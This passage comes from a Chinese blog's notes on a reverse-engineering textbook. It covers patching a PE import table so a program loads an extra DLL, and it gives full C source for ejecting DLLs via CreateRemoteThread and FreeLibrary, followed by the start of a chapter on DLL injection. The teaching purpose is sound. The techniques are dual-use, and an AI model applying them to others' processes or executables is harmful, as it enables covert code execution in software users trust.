src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221213336329.png" alt="图25-19 .rdata节区头"></p><p>向原属性值（Characteristics） 40000040添加IMAGE_SCN_MEM_WRITE （80000000）属性值。执行bit OR运算，最终属性值变为C0000040，如图25-20所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221213428013.png" alt="图25-20 HxD:向.text节区添加可写属性"></p><blockquote><p>TextView.exe文件的IAT原位于.rdata节区，且.rdata节区原本就没有可写属性，但程序仍能正常运行。可是若在TextView_Patched.exe中不进行上述操作，程序将无法正常运行。原因在哪？这是因为PE头的IMAGE_OPTIONAL_HEADER结构体DataDirectory数组中存在IAT，如图25-21所示。</p></blockquote><p>若IAT存在于该地址区域（ 6000~6154 ）,即使相应节区不具有可写属性也没关系。 图25-22是 TextView.exe 文件的 IAT 区域（RVA 6000）的一部分。</p><blockquote><p>从图25-22中可以看出，所有IAT均集中在相同区域（6000~6154）。同样，若不想在TextView_Patched.exe中给.rdata节区添加可写属性，可以在已存在的IAT区域后面为dummyO添加IAT，然后将IAT （ SIZE）增加8个字节。建议各位将经过这样修改的文件保存为 TextView_Patched2.exe.然后再与 TextView_Patched.exe 比较。</p></blockquote><p>我们至此完成了所有修改。运行TextView_Patch.exe文件将会正常加载myhack3.dll文件。</p><h1 id="25-5-检测验证"><a href="#25-5-检测验证" class="headerlink" title="25.5 检测验证"></a>25.5 检测验证</h1><p>首先使用PEView工具打开修改后的TextView_Patch.exe文件，查看其IDT，如图25-23所示。</p><p>向IDT导入myhack3.dll的IID结构体已设置正常。在图25-24中可以看到，myhack3.dll的dummy()函数被添加到INT。</p><p>从文件的结构分析来看，修改成功。接下来，直接运行文件看看程序能否正常运行。先将TextView_Patch.exe与myhack3.dll放入相同文件夹，然后运行TextView_Patch.exe文件，如图25-25所示。</p><p>使用Process Explorer工具查看TextView_Patch.exe进程中加载的DLL文件，可以看到已经成功加载myhack3.dll ,且被加载的myhack3.dll文件下载了指定网站的index.html文件，并在TextViewPatch. exe中显示。</p><h1 id="25-6小结"><a href="#25-6小结" class="headerlink" title="25.6小结"></a>25.6小结</h1><p>本章我们一起学习了直接修改PE文件来加载指定DLL文件的方法，其基本原理是将要加载的dll添加到IDT，这样程序运行时就会自动加载。只要理解了这一基本原理，再结合前面学过的有关PE文件头的知识，相信大家能够非常容易理解（关于PE文件头的知识请参考第13章）。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第25章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第24章 DLL卸载</title>
    <link href="/1999/02/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC24%E7%AB%A0%20DLL%E5%8D%B8%E8%BD%BD/"/>
    <url>/1999/02/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC24%E7%AB%A0%20DLL%E5%8D%B8%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>第24章DLL卸载<br>DLL卸载（DLL Ejection ）是将强制插入进程的DLL弹出的一种技术，其基本工作原理与使用CreateRemoteThread API进行DLL注入的原理类似。</p><h1 id="24-1-DLL卸载的工作原理"><a href="#24-1-DLL卸载的工作原理" class="headerlink" title="24.1 DLL卸载的工作原理"></a>24.1 DLL卸载的工作原理</h1><p>前面我们学习过使用CreateRemoteThread() API进行DLL注入的工作原理，概括如下:</p><p><strong>驱使目标进程调用LoadLibrary() API</strong></p><p>同样，DLL卸载工作原理也非常简单：</p><p><strong>驱使目标进程调用FreeLibrary() API</strong></p><p>也就是说，将FreeLibrary() API的地址传递给CreateRemoteThread()的lpStartAddress参数，并把要卸载的DLL的句柄传递给IpParameter参数。</p><blockquote><p>每个Windows内核对象（Kernel Object）都拥有一个引用计数（Reference Count）,代表对象被使用的次数。调用10次<code>LoadLibrary(&quot;a.dll&quot;)</code>，a.dll的引用计数就变为10，卸载a.dll时同样需要调用10次<code>Freelibrary()</code>（每调用一次<code>LoadLibrary()</code>,引用计数会加1;而每调用一次<code>Freelibrary()</code>,引用计数会减1）。因此，卸载DLL时要充分考虑好“引用计数”这个因素。</p></blockquote><h1 id="24-2实现DLL卸载"><a href="#24-2实现DLL卸载" class="headerlink" title="24.2实现DLL卸载"></a>24.2实现DLL卸载</h1><blockquote><p>下面介绍的源代码使用Microsoft Visual C++ Express 2010编写而成，并在Windows XP&#x2F;7 32位系统中通过测试。</p></blockquote><p>首先分析一下EjectDll.exe程序，它用来从目标进程（notepad.exe）卸载指定的DLL文件（myhack.dll，已注入目标进程），程序源代码（EjectDll.cpp ）如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// EjectDll.exe</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tlhelp32.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_PROC_NAME(<span class="hljs-string">L&quot;notepad.exe&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_DLL_NAME(<span class="hljs-string">L&quot;myhack.dll&quot;</span>)</span><br><br>DWORD <span class="hljs-title function_">FindProcessID</span><span class="hljs-params">(LPCTSTR szProcessName)</span><br>&#123;<br>    DWORD dwPID = <span class="hljs-number">0xFFFFFFFF</span>;<br>    HANDLE hSnapShot = INVALID_HANDLE_VALUE;<br>    PROCESSENTRY32 pe;<br><br>    <span class="hljs-comment">// Get the snapshot of the system</span><br>    pe.dwSize = <span class="hljs-keyword">sizeof</span>( PROCESSENTRY32 );<br>    hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, <span class="hljs-literal">NULL</span> );<br><br>    <span class="hljs-comment">// find process</span><br>    Process32First(hSnapShot, &amp;pe);<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))<br>        &#123;<br>            dwPID = pe.th32ProcessID;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(Process32Next(hSnapShot, &amp;pe));<br><br>    CloseHandle(hSnapShot);<br><br>    <span class="hljs-keyword">return</span> dwPID;<br>&#125;<br><br>BOOL <span class="hljs-title function_">SetPrivilege</span><span class="hljs-params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> <br>&#123;<br>    TOKEN_PRIVILEGES tp;<br>    HANDLE hToken;<br>    LUID luid;<br><br>    <span class="hljs-keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),<br>                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, <br>              &amp;hToken) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !LookupPrivilegeValue(<span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// lookup privilege on local system</span><br>                              lpszPrivilege,  <span class="hljs-comment">// privilege to lookup </span><br>                              &amp;luid) )        <span class="hljs-comment">// receives LUID of privilege</span><br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); <br>        <span class="hljs-keyword">return</span> FALSE; <br>    &#125;<br><br>    tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br>    <span class="hljs-keyword">if</span>( bEnablePrivilege )<br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>    <span class="hljs-keyword">else</span><br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Enable the privilege or disable all privileges.</span><br>    <span class="hljs-keyword">if</span>( !AdjustTokenPrivileges(hToken, <br>                               FALSE, <br>                               &amp;tp, <br>                               <span class="hljs-keyword">sizeof</span>(TOKEN_PRIVILEGES), <br>                               (PTOKEN_PRIVILEGES) <span class="hljs-literal">NULL</span>, <br>                               (PDWORD) <span class="hljs-literal">NULL</span>) )<br>    &#123; <br>        _tprintf(<span class="hljs-string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); <br>        <span class="hljs-keyword">return</span> FALSE; <br>    &#125; <br><br>    <span class="hljs-keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;The token does not have the specified privilege. \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125; <br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">EjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllName)</span><br>&#123;<br>    BOOL bMore = FALSE, bFound = FALSE;<br>    HANDLE hSnapshot, hProcess, hThread;<br>    HMODULE hModule = <span class="hljs-literal">NULL</span>;<br>    MODULEENTRY32 me = &#123; <span class="hljs-keyword">sizeof</span>(me) &#125;;<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    <span class="hljs-comment">// dwPID = notepad 进程 ID</span><br>    <span class="hljs-comment">// 使用TH32CS_SNAPM0DULE参数，获取加载到notepad进程的DLL名称</span><br>    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);<br><br>    bMore = Module32First(hSnapshot, &amp;me);<br>    <span class="hljs-keyword">for</span>( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )<br>    &#123;<br>        <span class="hljs-keyword">if</span>( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || <br>            !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )<br>        &#123;<br>            bFound = TRUE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( !bFound )<br>    &#123;<br>        CloseHandle(hSnapshot);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    hModule = GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class="hljs-string">&quot;FreeLibrary&quot;</span>);<br>    hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <br>                                 pThreadProc, me.modBaseAddr, <br>                                 <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br>    CloseHandle(hSnapshot);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>    DWORD dwPID = <span class="hljs-number">0xFFFFFFFF</span>;<br> <br>    <span class="hljs-comment">// find process</span><br>    dwPID = FindProcessID(DEF_PROC_NAME);<br>    <span class="hljs-keyword">if</span>( dwPID == <span class="hljs-number">0xFFFFFFFF</span> )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;There is no &lt;%s&gt; process!\n&quot;</span>, DEF_PROC_NAME);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    _tprintf(<span class="hljs-string">L&quot;PID of \&quot;%s\&quot; is %d\n&quot;</span>, DEF_PROC_NAME, dwPID);<br><br>    <span class="hljs-comment">// change privilege</span><br>    <span class="hljs-keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// eject dll</span><br>    <span class="hljs-keyword">if</span>( EjectDll(dwPID, DEF_DLL_NAME) )<br>        _tprintf(<span class="hljs-string">L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);<br>    <span class="hljs-keyword">else</span><br>        _tprintf(<span class="hljs-string">L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面介绍过，卸载DLL的原理是驱使目标对象自己调用FreeLibrary() API，上述代码中的EjectDll()函数就是用来卸载DLL的。下面仔细分析一下EjectDll()函数。</p><h2 id="24-2-1获取进程中加载的DLL信息"><a href="#24-2-1获取进程中加载的DLL信息" class="headerlink" title="24.2.1获取进程中加载的DLL信息"></a>24.2.1获取进程中加载的DLL信息</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);<br></code></pre></td></tr></table></figure><p>使用CreateToolhelp32Snapshot() API可以获取加载到进程的模块（DLL）信息。将获取的hSnapshot句柄传递给Module32First()&#x2F;Module32Next()函数后，即可设置与MODULEENTRY32结构体相关的模块信息。代码24-2是MODULEENTRY32结构体的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagMODULEENTRY32</span> &#123;</span><br>  DWORD   dwSize;<br>  DWORD   th32ModuleID;<br>  DWORD   th32ProcessID;<br>  DWORD   GlblcntUsage;<br>  DWORD   ProccntUsage;<br>  BYTE    *modBaseAddr;<br>  DWORD   modBaseSize;<br>  HMODULE hModule;<br>  <span class="hljs-type">char</span>    szModule[MAX_MODULE_NAME32 + <span class="hljs-number">1</span>];<br>  <span class="hljs-type">char</span>    szExePath[MAX_PATH];<br>&#125; MODULEENTRY32;<br></code></pre></td></tr></table></figure><p>szModule成员表示DLL的名称，modBaseAddr成员表示相应DLL被加载的地址（进程虚拟内存）。在EjectDll()函数的for循环中比较szModule与希望卸载的DLL文件名称，能够准确查找到相应模块的信息。</p><h2 id="24-2-2获取目标进程的句柄"><a href="#24-2-2获取目标进程的句柄" class="headerlink" title="24.2.2获取目标进程的句柄"></a>24.2.2获取目标进程的句柄</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hProcess=openProcess(PROCESS_ALL_ACCESS,FALSE,dwPID);<br></code></pre></td></tr></table></figure><p>该语句使用进程ID来获取目标进程（notepad）的进程句柄（下面用获得的进程句柄调用CreateRemoteThread() API）。</p><h2 id="24-2-3-获取-FreeLibrary-API-地址"><a href="#24-2-3-获取-FreeLibrary-API-地址" class="headerlink" title="24.2.3 获取 FreeLibrary() API 地址"></a>24.2.3 获取 FreeLibrary() API 地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">hModule=GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>pThreadProc=(LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class="hljs-string">&quot;FreeLibrary&quot;</span>);<br></code></pre></td></tr></table></figure><p>若要驱使notepad进程自己调用FreeLibrary() API，需要先得到FreeLibrary()的地址。然而上述代码获取的不是加载到notepad.exe进程中的Kernel32!FreeLibrary地址，而是加载到EjectDll.exe进程中的Kemel32!FreeLibrary地址。如果理解了前面学过的有关DLL注入的内容，那么各位应该能猜出其中缘由——FreeLibrary地址在所有进程中都是相同的。</p><h2 id="24-2-4在目标进程中运行线程"><a href="#24-2-4在目标进程中运行线程" class="headerlink" title="24.2.4在目标进程中运行线程"></a>24.2.4在目标进程中运行线程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hThread=CreateRemoteThread(hProcess,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,pThreadProc,me.modBaseAddr, <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>pThreadProc参数是FreeLibrary() API的地址，me.modBaseAddr参数是要卸载的DLL的加载地址。将线程函数指定为FreeLibrary函数，并把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary() API （ CreateRemoteThread() API原意是在外部进程调用执行线程函数，只不过这里的线程函数换成了FreeLibrary()函数）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">FreeLibrary</span><span class="hljs-params">(</span><br><span class="hljs-params">HMODULE hLibModule</span><br><span class="hljs-params"> <span class="hljs-comment">// handle to loaded library module</span></span><br><span class="hljs-params">)</span>;<br><br></code></pre></td></tr></table></figure><p>ThreadProc函数与FreeLibrary函数都只有1个参数，以上方法的灵感即源于此。</p><h1 id="24-3-DLL卸载练习"><a href="#24-3-DLL卸载练习" class="headerlink" title="24.3 DLL卸载练习"></a>24.3 DLL卸载练习</h1><p>本节一起做个练习，先将myhack.dll注入notepad.exe进程，随后再将其卸载。</p><h2 id="24-3-1-复制文件及运行notepad-exe"><a href="#24-3-1-复制文件及运行notepad-exe" class="headerlink" title="24.3.1 复制文件及运行notepad.exe"></a>24.3.1 复制文件及运行notepad.exe</h2><p>首先，复制下面3个文件到工作文件夹（c:\work），如图24-1所示。</p><p>然后，运行notepad.exe并查看其PID，如图24-2所示。我的电脑环境中，notepad.exe的PID为2832。</p><h2 id="24-3-2-注入-myhack-dll"><a href="#24-3-2-注入-myhack-dll" class="headerlink" title="24.3.2 注入 myhack.dll"></a>24.3.2 注入 myhack.dll</h2><p>打开命令行窗口（ cmd.exe ）,输入如下参数，将myhack.dll文件注入notepad.exe进程，如图24-3<br>所示。</p><p>可以在Process Explorer中看到myhack.dll注入成功，如图24.4所示。</p><h2 id="24-3-3-卸载-myhack-dll"><a href="#24-3-3-卸载-myhack-dll" class="headerlink" title="24.3.3 卸载 myhack.dll"></a>24.3.3 卸载 myhack.dll</h2><p>打开命令行窗口（cmd.exe），输入如下参数，将注入notepad.exe进程的myhack.dll文件卸载下<br>来，如图24-5所示。</p><p>请使用Process Explorer查看是否成功卸载。DLL卸载的基本原理与DLL注入的原理相同，理<br>解起来非常容易。请各位认真阅读上面的内容并亲自操作。</p><p>Q.使用FreeLibrary()卸载DLL的方法好像仅适用于使用CreateRemoteThread()注入的DLL 文件，有没有什么方法可以将加载的普通DLL文件卸载下来呢？ </p><p>A.正如您所说，使用FreeLibrary()的方法仅适用于卸载自己强制注入的DLL文件。PE文件直接导入的DLL文件是无法在进程运行过程中卸载的。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第24章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第23章 DLL注入</title>
    <link href="/1999/02/21/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5/"/>
    <url>/1999/02/21/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>第23章DLL注入<br>DLL注入（DLL Injection）是渗透其他进程的最简单有效的方法，本章将详细讲解DLL注入 的有关内容。借助DLL注入技术，可以钩取API、改进程序、修复Bug等。</p><h1 id="23-1-DLL-注入"><a href="#23-1-DLL-注入" class="headerlink" title="23.1 DLL 注入"></a>23.1 DLL 注入</h1><p>DLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary() API,加载（Loading）用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。图23-1描述了DLL注入的概念。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC23%E7%AB%A0%20DLL%E6%B3%A8%E5%85%A5.assets/image-20220221151648330-16454278349002.png" alt="图23-1 DLL注入"></p><p>从图23-1中可以看到，myhack.dll已被强制插入notepad进程（本来notepad并不会加载myhack.dll ）。加载到notepad.exe进程中的myhack.dll与已经加载到notepad.exe进程中的DLL（kemel32.dll、user32.dll） —样，拥有访问notepad.exe进程内存的（正当的）权限，这样用户就可以做任何想做的事了（比如：向notepad添加通信功能以实现Messenger、文本网络浏览器等）。</p><blockquote><p>DLL被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序Bug,或向程序添加新功能。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span><br>&#123;<br><span class="hljs-keyword">switch</span>( dwReason )<br>&#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br><span class="hljs-comment">// 添加想执行的代码</span><br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="23-2-DLL注入示例"><a href="#23-2-DLL注入示例" class="headerlink" title="23.2 DLL注入示例"></a>23.2 DLL注入示例</h1><p>使用LoadLibrary() API加载某个DLL时，该DLL中的DllMain()函数就会被调用执行。DLL注入的工作原理就是从外部促使目标进程调用LoadLibrary() API （与一般DLL加载相同），所以会强制调用执行DLL的DllMain()函数。并且，被注入的DLL拥有目标进程内存的访问权限，用户可以随意操作（修复Bug、添加功能等）。下面看一些使用DLL注入技术的示例。</p><h2 id="23-2-1-改善功能与修复Bug"><a href="#23-2-1-改善功能与修复Bug" class="headerlink" title="23.2.1 改善功能与修复Bug"></a>23.2.1 改善功能与修复Bug</h2><p>DLL注入技术可用于改善功能与修复Bug。没有程序对应的源码，或直接修改程序比较困难时，就可以使用DLL注入技术为程序添加新功能（类似于插件），或者修改有问题的代码、数据。</p><h2 id="23-2-2-消息钩取"><a href="#23-2-2-消息钩取" class="headerlink" title="23.2.2 消息钩取"></a>23.2.2 消息钩取</h2><p>Windows OS默认提供的消息钩取功能应用的就是一种DLL注入技术。与常规的DLL注入唯一的区别是，OS会直接将已注册的钩取DLL注入目标进程。</p><blockquote><p>我曾经从网上下载过一个Hex Editor，它不支持鼠标滚轮滑动，所以我用消息钩取技术为其添加了鼠标滚轮支持。虽然可以下载更多、更好用的Hex Editor,但是利用学到的技术改善、扩展程序功能是一种非常妙的体验。这样不仅能解决问题，还锻炼了 我们灵活应用技术的能力（此后我就开始对使用逆向技术改善已有程序的功能产生了浓厚兴趣）。</p></blockquote><h2 id="23-2-3-API-钩取"><a href="#23-2-3-API-钩取" class="headerlink" title="23.2.3 API 钩取"></a>23.2.3 API 钩取</h2><p>API钩取广泛应用于实际的项目开发，而进行API钩取时经常使用DLL注入技术。先创建好DLL形态的钩取函数，再将其轻松注入要钩取的目标进程，这样就完成了API钩取。这灵活运用了 “被注入的DLL拥有目标进程内存访问权限”这一特性。</p><h2 id="23-2-4-其他应用程序"><a href="#23-2-4-其他应用程序" class="headerlink" title="23.2.4 其他应用程序"></a>23.2.4 